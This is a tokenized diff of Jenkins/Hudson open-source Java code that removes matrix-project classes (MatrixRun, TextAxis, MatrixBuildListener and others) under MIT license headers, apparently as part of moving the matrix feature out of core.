"rebuildConfigurations", "(", "null", ")", ";", "}", "/", "**", "*", "Verifies", "that", "Axis", "names", "are", "valid", "and", "unique", ".", "*", "/", "private", "void", "checkAxisNames", "(", "Iterable", "<", "Axis", ">", "newAxes", ")", "throws", "FormException", "{", "HashSet", "<", "String", ">", "axisNames", "=", "new", "HashSet", "<", "String", ">", "()", ";", "for", "(", "Axis", "a", ":", "newAxes", ")", "{", "FormValidation", "fv", "=", "a", ".", "getDescriptor", "(", ").", "doCheckName", "(", "a", ".", "getName", "(", "))", ";", "if", "(", "fv", ".", "kind", "!", "=", "Kind", ".", "OK", ")", "throw", "new", "FormException", "(", "Messages", ".", "MatrixProject_DuplicateAxisName", "(", "),", "fv", ",", "\"", "axis", ".", "name", "\"", ");", "if", "(", "axisNames", ".", "contains", "(", "a", ".", "getName", "(", "))", ")", "throw", "new", "FormException", "(", "Messages", ".", "MatrixProject_DuplicateAxisName", "(", "),", "\"", "axis", ".", "name", "\"", ");", "axisNames", ".", "add", "(", "a", ".", "getName", "(", "))", ";", "}", "}", "/", "**", "*", "Also", "delete", "all", "the", "workspaces", "of", "the", "configuration", ",", "too", ".", "*", "/", "@", "Override", "public", "HttpResponse", "doDoWipeOutWorkspace", "(", ")", "throws", "IOException", ",", "ServletException", ",", "InterruptedException", "{", "HttpResponse", "rsp", "=", "super", ".", "doDoWipeOutWorkspace", "(", ");", "for", "(", "MatrixConfiguration", "c", ":", "configurations", ".", "values", "(", "))", "c", ".", "doDoWipeOutWorkspace", "(", ");", "return", "rsp", ";", "}", "@", "Override", "public", "ContextMenu", "doChildrenContextMenu", "(", "StaplerRequest", "request", ",", "StaplerResponse", "response", ")", "throws", "Exception", "{", "ContextMenu", "menu", "=", "new", "ContextMenu", "(", ");", "for", "(", "MatrixConfiguration", "c", ":", "getActiveConfigurations", "(", "))", "{", "menu", ".", "add", "(", "c", ")", ";", "}", "return", "menu", ";", "}", "public", "DescriptorImpl", "getDescriptor", "(", ")", "{", "return", "(", "DescriptorImpl", ")", "Jenkins", ".", "getInstance", "(", ").", "getDescriptorOrDie", "(", "getClass", "(", "))", ";", "}", "/", "**", "*", "Descriptor", "is", "instantiated", "as", "a", "field", "purely", "for", "backward", "compatibility", ".", "*", "Do", "not", "do", "this", "in", "your", "code", ".", "Put", "@", "Extension", "on", "your", "DescriptorImpl", "class", "instead", ".", "*", "/", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "@", "Extension", "public", "static", "final", "DescriptorImpl", "DESCRIPTOR", "=", "new", "DescriptorImpl", "(", ");", "public", "static", "final", "class", "DescriptorImpl", "extends", "AbstractProjectDescriptor", "{", "public", "String", "getDisplayName", "(", ")", "{", "return", "Messages", ".", "MatrixProject_DisplayName", "(", ");", "}", "public", "MatrixProject", "newInstance", "(", "ItemGroup", "parent", ",", "String", "name", ")", "{", "return", "new", "MatrixProject", "(", "parent", ",", "name", ")", ";", "}", "/", "**", "*", "All", "{", "@", "link", "AxisDescriptor", "}", "s", "that", "contribute", "to", "the", "UI", ".", "*", "/", "public", "List", "<", "AxisDescriptor", ">", "getAxisDescriptors", "(", ")", "{", "List", "<", "AxisDescriptor", ">", "r", "=", "new", "ArrayList", "<", "AxisDescriptor", ">", "()", ";", "for", "(", "AxisDescriptor", "d", ":", "Axis", ".", "all", "(", "))", "{", "if", "(", "d", ".", "isInstantiable", "(", "))", "r", ".", "add", "(", "d", ")", ";", "}", "return", "r", ";", "}", "/", "**", "*", "@", "deprecated", "as", "of", "1", ".", "456", "*", "This", "was", "only", "exposed", "for", "Jelly", ".", "*", "/", "public", "List", "<", "MatrixConfigurationSorterDescriptor", ">", "getSorterDescriptors", "(", ")", "{", "return", "MatrixConfigurationSorterDescriptor", ".", "all", "(", ");", "}", "public", "List", "<", "MatrixExecutionStrategyDescriptor", ">", "getExecutionStrategyDescriptors", "(", ")", "{", "return", "MatrixExecutionStrategyDescriptor", ".", "all", "(", ");", "}", "public", "List", "<", "SCMCheckoutStrategyDescriptor", ">", "getMatrixRunCheckoutStrategyDescriptors", "(", ")", "{", "return", "SCMCheckoutStrategyDescriptor", ".", "all", "(", ");", "}", "}", "private", "static", "final", "Logger", "LOGGER", "=", "Logger", ".", "getLogger", "(", "MatrixProject", ".", "class", ".", "getName", "(", "))", ";", "}", "@", "@", "-", "1", ",", "186", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "EnvVars", ";", "import", "hudson", ".", "FilePath", ";", "import", "hudson", ".", "model", ".", "AbstractBuild", ";", "import", "hudson", ".", "model", ".", "Build", ";", "import", "hudson", ".", "model", ".", "Node", ";", "import", "hudson", ".", "slaves", ".", "WorkspaceList", ";", "import", "hudson", ".", "slaves", ".", "WorkspaceList", ".", "Lease", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "Ancestor", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "Stapler", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerRequest", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "Calendar", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "/", "**", "*", "Execution", "of", "{", "@", "link", "MatrixConfiguration", "}", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "MatrixRun", "extends", "Build", "<", "MatrixConfiguration", ",", "MatrixRun", ">", "{", "public", "MatrixRun", "(", "MatrixConfiguration", "job", ")", "throws", "IOException", "{", "super", "(", "job", ")", ";", "}", "public", "MatrixRun", "(", "MatrixConfiguration", "job", ",", "Calendar", "timestamp", ")", "{", "super", "(", "job", ",", "timestamp", ")", ";", "}", "public", "MatrixRun", "(", "MatrixConfiguration", "project", ",", "File", "buildDir", ")", "throws", "IOException", "{", "super", "(", "project", ",", "buildDir", ")", ";", "}", "@", "Override", "public", "String", "getUpUrl", "(", ")", "{", "StaplerRequest", "req", "=", "Stapler", ".", "getCurrentRequest", "(", ");", "if", "(", "req", "!", "=", "null", ")", "{", "List", "<", "Ancestor", ">", "ancs", "=", "req", ".", "getAncestors", "(", ");", "for", "(", "int", "i", "=", "1", ";", "i", "<", "ancs", ".", "size", "(", ");", "i", "+", "+)", "{", "if", "(", "ancs", ".", "get", "(", "i", ")", ".", "getObject", "(", ")=", "=", "this", ")", "{", "Object", "parentObj", "=", "ancs", ".", "get", "(", "i", "-", "1", ")", ".", "getObject", "(", ");", "if", "(", "parentObj", "instanceof", "MatrixBuild", "|", "|", "parentObj", "instanceof", "MatrixConfiguration", ")", "{", "return", "ancs", ".", "get", "(", "i", "-", "1", ")", ".", "getUrl", "(", ")+", "'/", "';", "}", "}", "}", "}", "return", "super", ".", "getDisplayName", "(", ");", "}", "/", "**", "*", "Gets", "the", "{", "@", "link", "MatrixBuild", "}", "that", "has", "the", "same", "build", "number", ".", "*", "*", "@", "return", "*", "null", "if", "no", "such", "build", "exists", ",", "which", "happens", "when", "the", "module", "build", "*", "is", "manually", "triggered", ".", "*", "/", "public", "MatrixBuild", "getParentBuild", "(", ")", "{", "return", "getParent", "(", ").", "getParent", "(", ").", "getBuildByNumber", "(", "getNumber", "(", "))", ";", "}", "/", "**", "*", "The", "same", "as", "{", "@", "link", "#", "getParentBuild", "(", ")}", ".", "*", "/", "@", "Override", "public", "AbstractBuild", "<", "?,", "?", ">", "getRootBuild", "(", ")", "{", "return", "getParentBuild", "(", ");", "}", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "StaplerRequest", "req", "=", "Stapler", ".", "getCurrentRequest", "(", ");", "if", "(", "req", "!", "=", "null", ")", "{", "List", "<", "Ancestor", ">", "ancs", "=", "req", ".", "getAncestors", "(", ");", "for", "(", "int", "i", "=", "1", ";", "i", "<", "ancs", ".", "size", "(", ");", "i", "+", "+)", "{", "if", "(", "ancs", ".", "get", "(", "i", ")", ".", "getObject", "(", ")=", "=", "this", ")", "{", "if", "(", "ancs", ".", "get", "(", "i", "-", "1", ")", ".", "getObject", "(", ")", "instanceof", "MatrixBuild", ")", "{", "return", "getParent", "(", ").", "getCombination", "(", ").", "toCompactString", "(", "getParent", "(", ").", "getParent", "(", ").", "getAxes", "(", "))", ";", "}", "}", "}", "}", "return", "super", ".", "getDisplayName", "(", ");", "}", "@", "Override", "public", "Map", "<", "String", ",", "String", ">", "getBuildVariables", "(", ")", "{", "Map", "<", "String", ",", "String", ">", "r", "=", "super", ".", "getBuildVariables", "(", ");", "/", "/", "pick", "up", "user", "axes", "AxisList", "axes", "=", "getParent", "(", ").", "getParent", "(", ").", "getAxes", "(", ");", "for", "(", "Map", ".", "Entry", "<", "String", ",", "String", ">", "e", ":", "getParent", "(", ").", "getCombination", "(", ").", "entrySet", "(", "))", "{", "Axis", "a", "=", "axes", ".", "find", "(", "e", ".", "getKey", "(", "))", ";", "if", "(", "a", "!", "=", "null", ")", "a", ".", "addBuildVariable", "(", "e", ".", "getValue", "(", "),", "r", ")", ";", "else", "r", ".", "put", "(", "e", ".", "getKey", "(", "),", "e", ".", "getValue", "(", "))", ";", "}", "return", "r", ";", "}", "/", "**", "*", "If", "the", "parent", "{", "@", "link", "MatrixBuild", "}", "is", "kept", ",", "keep", "this", "record", "too", ".", "*", "/", "@", "Override", "public", "String", "getWhyKeepLog", "(", ")", "{", "MatrixBuild", "pb", "=", "getParentBuild", "(", ");", "if", "(", "pb", "!", "=", "null", "&", "&", "pb", ".", "getWhyKeepLog", "(", ")!", "=", "null", ")", "return", "Messages", ".", "MatrixRun_KeptBecauseOfParent", "(", "pb", ")", ";", "return", "super", ".", "getWhyKeepLog", "(", ");", "}", "@", "Override", "public", "MatrixConfiguration", "getParent", "(", ")", "{", "//", "don", "'", "t", "know", "why", ",", "but", "javac", "wants", "this", "return", "super", ".", "getParent", "(", ");", "}", "@", "Override", "public", "void", "run", "(", ")", "{", "execute", "(", "new", "MatrixRunExecution", "(", "))", ";", "}", "private", "class", "MatrixRunExecution", "extends", "BuildExecution", "{", "protected", "Lease", "getParentWorkspaceLease", "(", "Node", "n", ",", "WorkspaceList", "wsl", ")", "throws", "InterruptedException", ",", "IOException", "{", "MatrixProject", "mp", "=", "getParent", "(", ").", "getParent", "(", ");", "String", "customWorkspace", "=", "mp", ".", "getCustomWorkspace", "(", ");", "if", "(", "customWorkspace", "!", "=", "null", ")", "{", "/", "/", "we", "allow", "custom", "workspaces", "to", "be", "concurrently", "used", "between", "jobs", ".", "return", "Lease", ".", "createDummyLease", "(", "n", ".", "getRootPath", "(", ").", "child", "(", "getEnvironment", "(", "listener", ")", ".", "expand", "(", "customWorkspace", ")", "))", ";", "}", "return", "wsl", ".", "allocate", "(", "n", ".", "getWorkspaceFor", "(", "mp", ")", ",", "getParentBuild", "(", "))", ";", "}", "@", "Override", "protected", "Lease", "decideWorkspace", "(", "Node", "n", ",", "WorkspaceList", "wsl", ")", "throws", "InterruptedException", ",", "IOException", "{", "MatrixProject", "mp", "=", "getParent", "(", ").", "getParent", "(", ");", "/", "/", "lock", "is", "done", "at", "the", "parent", "level", ",", "so", "that", "concurrent", "MatrixProjects", "get", "respective", "workspace", ",", "/", "/", "but", "within", "MatrixConfigurations", "that", "belong", "to", "the", "same", "MatrixBuild", ".", "/", "/", "if", "MatrixProject", "is", "configured", "with", "custom", "workspace", ",", "we", "assume", "that", "the", "user", "knows", "what", "he", "'", "s", "doing", "/", "/", "and", "try", "not", "to", "append", "unique", "random", "suffix", ".", "Lease", "baseLease", "=", "getParentWorkspaceLease", "(", "n", ",", "wsl", ")", ";", "/", "/", "resolve", "the", "relative", "path", "against", "the", "parent", "workspace", ",", "which", "needs", "locking", "FilePath", "baseDir", "=", "baseLease", ".", "path", ";", "/", "/", "prepare", "variables", "that", "can", "be", "used", "in", "the", "child", "workspace", "setting", "EnvVars", "env", "=", "getEnvironment", "(", "listener", ")", ";", "env", ".", "put", "(", "\"", "COMBINATION", "\"", ",", "getParent", "(", ").", "getCombination", "(", ").", "toString", "(", "'/", "',", "'/", "')", ");", "/", "/", "e", ".", "g", ".", ",", "\"", "axis1", "/", "a", "/", "axis2", "/", "b", "\"", "env", ".", "put", "(", "\"", "SHORT_COMBINATION", "\"", ",", "getParent", "(", ").", "getDigestName", "(", "))", ";", "/", "/", "e", ".", "g", ".", ",", "\"", "0fbcab35", "\"", "env", ".", "put", "(", "\"", "PARENT_WORKSPACE", "\"", ",", "baseDir", ".", "getRemote", "(", "))", ";", "env", ".", "putAll", "(", "getBuildVariables", "(", "))", ";", "/", "/", "child", "workspace", "need", "no", "individual", "locks", ",", "whether", "or", "not", "we", "use", "custom", "workspace", "String", "childWs", "=", "mp", ".", "getChildCustomWorkspace", "(", ");", "return", "Lease", ".", "createLinkedDummyLease", "(", "baseDir", ".", "child", "(", "env", ".", "expand", "(", "childWs", ")", "),", "baseLease", ")", ";", "}", "}", "}", "@", "@", "-", "1", ",", "33", "+", "0", ",", "0", "@", "@", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "Extension", ";", "import", "hudson", ".", "util", ".", "FormValidation", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "DataBoundConstructor", ";", "/", "**", "*", "Place", "holder", "for", "default", "\"", "do", "not", "sort", "\"", "{", "@", "link", "MatrixConfigurationSorter", "}", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "NoopMatrixConfigurationSorter", "extends", "MatrixConfigurationSorter", "{", "@", "DataBoundConstructor", "public", "NoopMatrixConfigurationSorter", "(", ")", "{", "}", "@", "Override", "public", "void", "validate", "(", "MatrixProject", "p", ")", "throws", "FormValidation", "{", "/", "/", "nothing", "}", "public", "int", "compare", "(", "MatrixConfiguration", "o1", ",", "MatrixConfiguration", "o2", ")", "{", "return", "o1", ".", "getDisplayName", "(", ").", "compareTo", "(", "o2", ".", "getDisplayName", "(", "))", ";", "}", "@", "Extension", "(", "ordinal", "=", "100", ")", "/", "/", "this", "is", "the", "default", "public", "static", "class", "DescriptorImpl", "extends", "MatrixConfigurationSorterDescriptor", "{", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "\"", "Doesn", "'", "t", "care", "\"", ";", "}", "}", "}", "@", "@", "-", "1", ",", "34", "+", "0", ",", "0", "@", "@", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "Extension", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "DataBoundConstructor", ";", "import", "java", ".", "util", ".", "List", ";", "/", "**", "*", "User", "-", "defined", "plain", "text", "axis", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "TextAxis", "extends", "Axis", "{", "public", "TextAxis", "(", "String", "name", ",", "List", "<", "String", ">", "values", ")", "{", "super", "(", "name", ",", "values", ")", ";", "}", "public", "TextAxis", "(", "String", "name", ",", "String", ".", "..", "values", ")", "{", "super", "(", "name", ",", "values", ")", ";", "}", "@", "DataBoundConstructor", "public", "TextAxis", "(", "String", "name", ",", "String", "valueString", ")", "{", "super", "(", "name", ",", "valueString", ")", ";", "}", "@", "Extension", "public", "static", "class", "DescriptorImpl", "extends", "AxisDescriptor", "{", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "Messages", ".", "TextArea_DisplayName", "(", ");", "}", "}", "}", "@", "@", "-", "1", ",", "84", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2011", ",", "Christian", "Wolfgang", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ".", "listeners", ";", "import", "hudson", ".", "ExtensionList", ";", "import", "hudson", ".", "ExtensionPoint", ";", "import", "hudson", ".", "matrix", ".", "MatrixConfiguration", ";", "import", "hudson", ".", "matrix", ".", "MatrixBuild", ";", "import", "hudson", ".", "matrix", ".", "MatrixRun", ";", "import", "hudson", ".", "model", ".", "Action", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "hudson", ".", "model", ".", "Queue", ";", "import", "hudson", ".", "model", ".", "Queue", ".", "Task", ";", "import", "java", ".", "util", ".", "List", ";", "/", "**", "*", "Controls", "which", "subset", "of", "{", "@", "link", "MatrixRun", "}", "s", "to", "rebuild", ".", "*", "*", "<", "p", ">", "*", "Plugins", "can", "implement", "this", "extension", "point", "to", "filter", "out", "the", "subset", "of", "matrix", "project", "to", "build", ".", "*", "Most", "typically", ",", "such", "a", "plugin", "would", "add", "a", "custom", "{", "@", "link", "Action", "}", "to", "a", "build", "when", "it", "goes", "to", "the", "queue", "*", "(", "{@", "link", "Queue", "#", "schedule2", "(", "Task", ",", "int", ",", "List", ")", "},", "then", "access", "this", "from", "{", "@", "link", "MatrixBuild", "}", "to", "drive", "*", "the", "filtering", "logic", ".", "*", "*", "<", "p", ">", "*", "See", "the", "matrix", "reloaded", "plugin", "for", "an", "example", ".", "*", "*", "@", "author", "Christian", "Wolfgang", "*", "@", "since", "1", ".", "413", "*", "/", "public", "abstract", "class", "MatrixBuildListener", "implements", "ExtensionPoint", "{", "/", "**", "*", "Determine", "whether", "to", "build", "a", "given", "configuration", "or", "not", "*", "*", "@", "param", "b", "*", "Never", "null", ".", "The", "umbrella", "build", ".", "*", "@", "param", "c", "*", "The", "configuration", "whose", "build", "is", "being", "considered", ".", "If", "any", "of", "the", "{", "@", "link", "MatrixBuildListener", "}", "*", "returns", "false", ",", "then", "the", "build", "for", "this", "configuration", "is", "skipped", ",", "and", "the", "previous", "build", "*", "of", "this", "configuration", "will", "be", "taken", "as", "the", "default", "result", ".", "*", "@", "return", "*", "True", "to", "let", "the", "build", "happen", ",", "false", "to", "skip", "it", ".", "*", "/", "public", "abstract", "boolean", "doBuildConfiguration", "(", "MatrixBuild", "b", ",", "MatrixConfiguration", "c", ")", ";", "public", "static", "boolean", "buildConfiguration", "(", "MatrixBuild", "b", ",", "MatrixConfiguration", "c", ")", "{", "for", "(", "MatrixBuildListener", "l", ":", "all", "(", "))", "{", "if", "(", "!", "l", ".", "doBuildConfiguration", "(", "b", ",", "c", ")", ")", "{", "return", "false", ";", "}", "}", "return", "true", ";", "}", "/", "**", "*", "Returns", "all", "the", "registered", "{", "@", "link", "MatrixBuildListener", "}", "descriptors", ".", "*", "/", "public", "static", "ExtensionList", "<", "MatrixBuildListener", ">", "all", "(", ")", "{", "return", "Jenkins", ".", "getInstance", "(", ").", "getExtensionList", "(", "MatrixBuildListener", ".", "class", ")", ";", "}", "}", "@", "@", "-", "1", ",", "27", "+", "0", ",", "0", "@", "@", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "html", ">", "<", "head", "/", "><", "body", ">", "Matrix", "project", "<", "/", "body", ">", "</", "html", ">", "import", "hudson", ".", "matrix", ".", "MatrixConfiguration", ";", "*", "This", "mechanism", "is", "used", "by", "{", "@", "link", "MatrixConfiguration", "}", "to", "pass", "import", "hudson", ".", "matrix", ".", "MatrixProject", ";", "import", "hudson", ".", "matrix", ".", "MatrixConfiguration", ";", "import", "hudson", ".", "matrix", ".", "Axis", ";", "XSTREAM", ".", "alias", "(", "\"", "matrix", "-", "project", "\"", ",", "MatrixProject", ".", "class", ")", ";", "XSTREAM", ".", "alias", "(", "\"", "axis", "\"", ",", "Axis", ".", "class", ")", ";", "XSTREAM", ".", "alias", "(", "\"", "matrix", "-", "config", "\"", ",", "MatrixConfiguration", ".", "class", ")", ";", "import", "hudson", ".", "matrix", ".", "MatrixChildAction", ";", "public", "class", "ParametersAction", "implements", "Action", ",", "Iterable", "<", "ParameterValue", ">", ",", "QueueAction", ",", "EnvironmentContributingAction", ",", "LabelAssignmentAction", ",", "MatrixChildAction", "{", "import", "hudson", ".", "matrix", ".", "MatrixBuild", ";", "import", "hudson", ".", "matrix", ".", "MatrixRun", ";", "XSTREAM", ".", "alias", "(", "\"", "matrix", "-", "build", "\"", ",", "MatrixBuild", ".", "class", ")", ";", "XSTREAM", ".", "alias", "(", "\"", "matrix", "-", "run", "\"", ",", "MatrixRun", ".", "class", ")", ";", "import", "hudson", ".", "matrix", ".", "MatrixConfiguration", ";", "*", "Ones", "that", "don", "'", "t", "need", "to", "be", "under", "specific", "parent", "(", "say", ",", "unlike", "{", "@", "link", "MatrixConfiguration", "}", "),", "import", "hudson", ".", "matrix", ".", "MatrixConfiguration", ";", "if", "(", "key", "instanceof", "MatrixConfiguration", ")", "{", "import", "hudson", ".", "matrix", ".", "MatrixAggregatable", ";", "import", "hudson", ".", "matrix", ".", "MatrixAggregator", ";", "import", "hudson", ".", "matrix", ".", "MatrixBuild", ";", "import", "hudson", ".", "tasks", ".", "test", ".", "TestResultAggregator", ";", "public", "class", "JUnitResultArchiver", "extends", "Recorder", "implements", "MatrixAggregatable", "{", "public", "MatrixAggregator", "createAggregator", "(", "MatrixBuild", "build", ",", "Launcher", "launcher", ",", "BuildListener", "listener", ")", "{", "return", "new", "TestResultAggregator", "(", "build", ",", "launcher", ",", "listener", ")", ";", "}", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Yahoo", "!", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "tasks", ".", "test", ";", "import", "hudson", ".", "matrix", ".", "Combination", ";", "import", "hudson", ".", "matrix", ".", "MatrixBuild", ";", "import", "hudson", ".", "matrix", ".", "MatrixRun", ";", "import", "hudson", ".", "model", ".", "AbstractBuild", ";", "import", "hudson", ".", "model", ".", "Action", ";", "/", "**", "*", "{", "@", "link", "Action", "}", "that", "aggregates", "all", "the", "test", "results", "from", "{", "@", "link", "MatrixRun", "}", "s", ".", "*", "*", "<", "p", ">", "*", "This", "object", "is", "attached", "to", "{", "@", "link", "MatrixBuild", "}", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "MatrixTestResult", "extends", "AggregatedTestResultAction", "{", "@", "Deprecated", "public", "MatrixTestResult", "(", "MatrixBuild", "owner", ")", "{", "super", "(", "owner", ")", ";", "}", "/", "**", "@", "since", "1", ".", "545", "*", "/", "public", "MatrixTestResult", "(", ")", "{", "}", "/", "**", "*", "Use", "the", "configuration", "name", ".", 